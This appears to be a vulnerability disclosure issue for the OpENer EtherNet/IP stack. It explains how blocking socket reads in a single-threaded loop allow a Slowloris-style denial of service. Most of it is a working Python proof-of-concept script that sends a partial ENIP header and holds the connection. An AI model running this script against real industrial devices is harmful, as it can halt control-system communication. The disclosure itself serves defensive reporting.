@@ -1,0 +1,98 @@
+issue #562
+
+Vulnerability Description
+
+I find that OpENer 2.3.0 (commit 76b95cf) is vulnerable to a Slowloris-style DoS attack. Because OpENer processes all network traffic in a single-threaded event loop without setting client sockets to non-blocking mode, an attacker can establish a single TCP connection, send an incomplete Ethernet/IP (ENIP) packet, and simply wait. This completely blocks the server's main network processing loop, preventing it from handling any other legitimate requests.
+
+Root Cause
+
+The root cause lies in the synchronous, blocking nature of the socket reads within the single-threaded network handler:
+
+Single-threaded event loop: NetworkHandlerProcessCyclic() uses select() in a single thread to multiplex all incoming socket events.
+Missing non-blocking configuration: When a new TCP connection is accepted in CheckAndHandleTcpListenerSocket(), the newly created new_socket is added to the select read set but is not set to non-blocking mode.
+Blocking reads: In HandleDataOnTcpSocket(), the code expects a complete ENIP packet and issues direct, blocking reads: recv(socket, ..., 4, 0) followed by a loop reading data_size. If an attacker sends exactly 4 bytes (the ENIP command and length) and intentionally delays sending the rest of the payload, the second recv() call will block indefinitely until data arrives or a TCP timeout occurs. During this time, the entire NetworkHandlerProcessCyclic loop is stalled.
+
+PoC
+
+import argparse
+import socket
+import sys
+import time
+
+
+def build_enip_header(command: int, payload_len: int) -> bytes:
+    # ENIP header is 24 bytes:
+    # command(2), length(2), session(4), status(4), context(8), options(4)
+    return (
+        command.to_bytes(2, "little")
+        + payload_len.to_bytes(2, "little")
+        + b"\x00" * 4
+        + b"\x00" * 4
+        + b"SLOWL0R1"
+        + b"\x00" * 4
+    )
+
+
+def send_first_4_bytes(sock: socket.socket, declared_payload_len: int) -> None:
+    # OpENer first recv() reads 4 bytes and derives data_size from bytes[2:4].
+    # We intentionally send just these 4 bytes, then stop sending.
+    header = build_enip_header(command=0x006F, payload_len=declared_payload_len)
+    sock.sendall(header[:4])
+    print(
+        f"[*] Sent first 4 bytes only (declared payload length={declared_payload_len})."
+    )
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="Slowloris attacker for OpENer blocking recv() loop."
+    )
+    parser.add_argument("--host", default="127.0.0.1", help="Target host")
+    parser.add_argument("--port", type=int, default=44818, help="Target port")
+    parser.add_argument(
+        "--declared-length",
+        type=int,
+        default=128,
+        help="Declared ENIP payload length in first 4 bytes (default: 128)",
+    )
+    parser.add_argument(
+        "--tail-hold-seconds",
+        type=int,
+        default=60,
+        help="Keep socket idle after drip send (default: 60)",
+    )
+    args = parser.parse_args()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5.0)
+
+    try:
+        print(f"[*] Connecting to {args.host}:{args.port}")
+        sock.connect((args.host, args.port))
+        sock.settimeout(None)
+
+        send_first_4_bytes(sock, args.declared_length)
+        print("[*] Keep connection open without sending remaining bytes.")
+
+        if args.tail_hold_seconds > 0:
+            print(f"[*] Holding idle for {args.tail_hold_seconds} seconds...")
+            time.sleep(args.tail_hold_seconds)
+
+        print("[*] Attack flow finished.")
+        return 0
+    except KeyboardInterrupt:
+        print("\n[*] Interrupted by user.")
+        return 0
+    except Exception as exc:  # noqa: BLE001
+        print(f"[!] Attack failed: {type(exc).__name__}: {exc}")
+        return 1
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
